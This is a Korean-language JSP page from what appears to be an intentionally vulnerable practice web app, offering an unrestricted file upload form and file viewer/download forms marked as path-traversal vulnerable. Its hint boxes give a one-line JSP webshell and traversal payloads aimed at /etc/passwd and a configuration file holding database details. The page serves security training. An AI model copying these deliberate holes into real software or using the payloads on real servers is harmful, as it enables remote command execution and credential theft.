<%@ page contentType="text/html;charset=UTF-8" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>파일 업로드 - File Upload / Path Traversal</title>
  <style>
    body { font-family: 'Malgun Gothic', sans-serif; margin: 0; background: #f4f6f9; }
    .header { background: #003366; color: #fff; padding: 12px 30px; }
    .header a { color: #aad4ff; text-decoration: none; margin-right: 10px; }
    .container { max-width: 900px; margin: 24px auto; padding: 0 20px; }
    .card { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 20px; margin-bottom: 16px; }
    h2 { color: #003366; margin-top: 0; font-size: 16px; }
    .upload-form { background: #f8f9ff; border: 1px solid #c8d8ff; border-radius: 4px; padding: 16px; margin-bottom: 16px; }
    .upload-form input[type=file] { display: block; margin-bottom: 10px; }
    .upload-form button { padding: 10px 24px; background: #003366; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
    .success { background: #d4edda; border: 1px solid #28a745; color: #155724; padding: 12px; border-radius: 4px; font-size: 13px; }
    .error   { background: #f8d7da; border: 1px solid #dc3545; color: #721c24; padding: 12px; border-radius: 4px; font-size: 13px; }
    .hint { background: #fff8e1; border-left: 3px solid #ffc107; padding: 10px 14px; font-size: 12px; margin-bottom: 12px; }
    code { background: #f0f0f0; padding: 1px 4px; border-radius: 3px; font-size: 11px; }
    .file-list { list-style: none; padding: 0; }
    .file-list li { padding: 6px 0; border-bottom: 1px solid #eee; font-size: 13px; display: flex; gap: 10px; align-items: center; }
    .file-list a { color: #0055aa; text-decoration: none; }
    .dl-form { display: flex; gap: 10px; }
    .dl-form input { flex: 1; padding: 8px; border: 1px solid #bbb; border-radius: 4px; font-family: monospace; font-size: 12px; }
    .dl-form button { padding: 8px 16px; background: #555; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; }
  </style>
</head>
<body>
<div class="header">
  <a href="/nas/main/main.do">← 홈</a>
  <strong>파일 관리</strong>
  <span style="background:#e0ffe0;color:#060;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:bold;margin-left:10px;">File Upload + Path Traversal</span>
</div>

<div class="container">

  <!-- 파일 업로드 -->
  <div class="card">
    <h2>📤 파일 업로드 (확장자 검증 없음)</h2>
    <div class="hint">
      💡 <strong>테스트:</strong> .jsp, .html, .sh 등 모든 파일 업로드 가능<br>
      WebShell 예: <code>webshell.txt</code> 내용 → <code>&lt;%Runtime.getRuntime().exec(request.getParameter("cmd"));%&gt;</code>
    </div>
    <form class="upload-form" method="POST" action="/nas/file/uploadProc.do" enctype="multipart/form-data">
      <input type="file" name="file">
      <button type="submit">업로드</button>
    </form>

    <c:if test="${not empty success}">
      <div class="success">
        ✅ ${success}<br>
        저장 경로: <code>${savedPath}</code><br>
        파일 크기: ${fileSize} bytes | Content-Type: ${contentType}
      </div>
    </c:if>
    <c:if test="${not empty error}">
      <div class="error">❌ ${error}</div>
    </c:if>
  </div>

  <!-- Path Traversal - 뷰어 -->
  <div class="card">
    <h2>👁 파일 뷰어 (Path Traversal 취약)</h2>
    <div class="hint">
      💡 <strong>Path Traversal 테스트 (fileName 파라미터):</strong><br>
      <code>../../../etc/passwd</code> — Linux 계정 파일<br>
      <code>../../../etc/hosts</code> — 호스트 파일<br>
      <code>../../src/main/resources/application.properties</code> — 설정 파일 (DB 정보 포함)<br>
      <code>../../pom.xml</code> — 프로젝트 구조 파악
    </div>
    <form method="GET" action="/nas/file/view.do" style="margin-bottom:12px;">
      <div class="dl-form">
        <input type="text" name="fileName" placeholder="../../../etc/passwd">
        <button type="submit">읽기</button>
      </div>
    </form>
  </div>

  <!-- Path Traversal - 다운로드 -->
  <div class="card">
    <h2>⬇️ 파일 다운로드 (Path Traversal 취약)</h2>
    <div class="hint">
      💡 <strong>path 파라미터로 서버 임의 파일 다운로드:</strong><br>
      <code>/nas/file/download.do?path=../../../etc/passwd</code><br>
      <code>/nas/file/download.do?path=../../src/main/resources/application.properties</code>
    </div>
    <form method="GET" action="/nas/file/download.do">
      <div class="dl-form">
        <input type="text" name="path" placeholder="../../../etc/passwd">
        <button type="submit">다운로드</button>
      </div>
    </form>
  </div>

  <!-- 업로드된 파일 목록 -->
  <div class="card">
    <h2>📁 업로드 디렉토리: <code style="font-size:12px;">${uploadDir}</code></h2>
    <c:choose>
      <c:when test="${not empty files}">
        <ul class="file-list">
          <c:forEach var="f" items="${files}">
            <li>
              📄 ${f}
              <a href="/nas/file/view.do?fileName=${f}">[보기]</a>
              <a href="/nas/file/download.do?path=${f}">[다운로드]</a>
            </li>
          </c:forEach>
        </ul>
      </c:when>
      <c:otherwise>
        <p style="color:#999;font-size:13px;">업로드된 파일이 없습니다.</p>
      </c:otherwise>
    </c:choose>
  </div>

</div>
</body>
</html>
